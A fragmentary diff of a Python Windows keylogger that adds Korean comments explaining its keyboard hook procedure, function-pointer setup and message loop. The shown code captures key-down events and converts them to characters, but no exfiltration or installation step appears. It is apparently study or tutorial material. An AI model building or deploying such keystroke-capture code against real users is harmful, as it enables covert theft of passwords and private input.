@@ -24,7 +24,6 @@ class KeyLogger:
             0 # 후킹할 스레드 아이디
         )
 
-
         if not self.mHooked:
             return False
 
@@ -37,12 +36,15 @@ class KeyLogger:
         self.mUser32.UnhookWindowsHookEx( self.mHooked )
         self.mHooked = None
 
+# 훅 프로시저를 등록하기 위한 함수의 포인터를 얻어온다.
 def getFPTR( aFunc ):
     CMPFUNC = CFUNCTYPE( c_int, c_int, c_int, POINTER( c_void_p ) )
     return CMPFUNC( aFunc )
         
+# 훅 프로시저를 정의한다.
 def hookProc( aNCode, aWParam, aLParam ):
     if aWParam is not WM_KEYDOWN:
+        # 처리가 끝나면 훅 체인에 있는 다른 훅 프로시저에게 제어권을 넘겨준다.
         return gUser32.CallNextHookEx( gKeyLogger.mHooked, aNCode, aWParam, aLParam )
 
     sHookedKey = chr( aLParam[0] )
@@ -56,6 +58,7 @@ def hookProc( aNCode, aWParam, aLParam ):
 
     return gUser32.CallNextHookEx( gKeyLogger.mHooked, aNCode, aWParam, aLParam )
 
+# 메시지 전달
 def startKeyLog():
     sMsg = MSG()
     gUser32.GetMessageA( byref( sMsg ), 0, 0, 0 )
